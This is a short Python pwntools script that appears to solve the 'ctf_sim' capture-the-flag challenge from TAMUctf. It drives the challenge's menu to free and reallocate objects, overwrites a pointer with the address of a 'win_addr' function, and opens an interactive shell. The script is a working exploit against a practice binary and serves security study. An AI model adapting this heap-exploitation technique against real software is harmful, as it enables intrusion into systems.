from pwn import *

p = remote("tamuctf.com", 443, ssl=True, sni="ctf-sim")
e = ELF('./ctf_sim')

p.sendlineafter(b'> ', b'1')
p.sendlineafter(b'> ', b'1')
p.sendlineafter(b'> ', b'1')

p.sendlineafter(b'> ', b'2')
p.sendlineafter(b'> ', b'1')

p.sendlineafter(b'> ', b'3')
p.sendlineafter(b'> ', b'24')
p.sendlineafter(b'> ', p64(e.symbols['win_addr']))

p.sendlineafter(b'> ', b'2')
p.sendlineafter(b'> ', b'1')
p.interactive()
